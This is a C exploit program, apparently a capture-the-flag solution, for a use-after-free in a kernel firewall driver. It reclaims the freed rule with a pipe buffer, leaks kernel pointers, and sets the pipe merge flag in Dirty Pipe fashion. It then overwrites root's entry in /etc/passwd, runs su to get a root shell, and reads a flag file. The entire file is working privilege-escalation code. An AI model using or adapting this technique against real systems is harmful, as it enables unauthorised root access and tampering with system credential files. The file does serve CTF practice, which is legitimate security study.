#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <unistd.h>

#define FW_ADD  0x41004601UL
#define FW_DEL  0x40044602UL
#define FW_EDIT 0x44184603UL
#define FW_SHOW 0x84184604UL

#define PIPE_BUF_FLAG_CAN_MERGE 0x10

struct fw_req {
    uint32_t idx;
    uint32_t pad;
    uint64_t off;
    uint64_t len;
    unsigned char data[0x400];
};

static void die(const char *msg) {
    perror(msg);
    exit(1);
}

static long add_rule(int fw) {
    char rule[0x100] = "1.1.1.1 2.2.2.2 80 0 uaf";
    long idx = ioctl(fw, FW_ADD, rule);
    if (idx < 0) die("FW_ADD");
    return idx;
}

static void edit_rule(int fw, uint32_t idx, uint64_t off, const void *buf, uint64_t len) {
    struct fw_req req;
    memset(&req, 0, sizeof(req));
    req.idx = idx;
    req.off = off;
    req.len = len;
    memcpy(req.data, buf, len);
    if (ioctl(fw, FW_EDIT, &req) < 0) die("FW_EDIT");
}

static void show_rule(int fw, uint32_t idx, void *buf, uint64_t off, uint64_t len) {
    struct fw_req req;
    memset(&req, 0, sizeof(req));
    req.idx = idx;
    req.off = off;
    req.len = len;
    if (ioctl(fw, FW_SHOW, &req) < 0) die("FW_SHOW");
    memcpy(buf, req.data, len);
}

static void overwrite_passwd(int fw, uint32_t idx) {
    int p[2];
    if (pipe(p) < 0) die("pipe");

    int passwd = open("/etc/passwd", O_RDONLY);
    if (passwd < 0) die("open /etc/passwd");

    loff_t off = 4; /* splice the ':' before root's password field */
    ssize_t n = splice(passwd, &off, p[1], NULL, 1, 0);
    if (n != 1) die("splice");

    unsigned char leak[0x40];
    show_rule(fw, idx, leak, 0, sizeof(leak));
    uint64_t page = *(uint64_t *)(leak + 0);
    uint32_t poff = *(uint32_t *)(leak + 8);
    uint32_t plen = *(uint32_t *)(leak + 12);
    uint64_t ops = *(uint64_t *)(leak + 16);
    uint32_t flags = *(uint32_t *)(leak + 24);
    printf("[*] pipe_buffer page=%p off=%u len=%u ops=%p flags=0x%x\n",
           (void *)page, poff, plen, (void *)ops, flags);

    if ((page >> 48) != 0xffff || poff != 4 || plen != 1 || ops == 0) {
        fprintf(stderr, "[-] freed rule was not reclaimed by the target pipe\n");
        exit(1);
    }

    flags |= PIPE_BUF_FLAG_CAN_MERGE;
    edit_rule(fw, idx, 24, &flags, sizeof(flags));

    static const char payload[] =
        ":0:0:root:/root:/bin/sh\n"
        "ctf:x:1000:1000::/home/ctf:/bin/sh\n";

    if (write(p[1], payload, sizeof(payload) - 1) != (ssize_t)(sizeof(payload) - 1)) {
        die("write pipe");
    }

    close(passwd);
    close(p[0]);
    close(p[1]);
}

int main(void) {
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    int fw = open("/dev/firewall", O_RDWR);
    if (fw < 0) die("open /dev/firewall");

    long idx = add_rule(fw);
    printf("[*] rule index %ld\n", idx);
    if (ioctl(fw, FW_DEL, (unsigned long)idx) < 0) die("FW_DEL");

    overwrite_passwd(fw, (uint32_t)idx);

    puts("[*] patched /etc/passwd");
    execl("/bin/su", "su", "root", "-c", "id; cat /flag.txt", NULL);
    die("execl su");
}
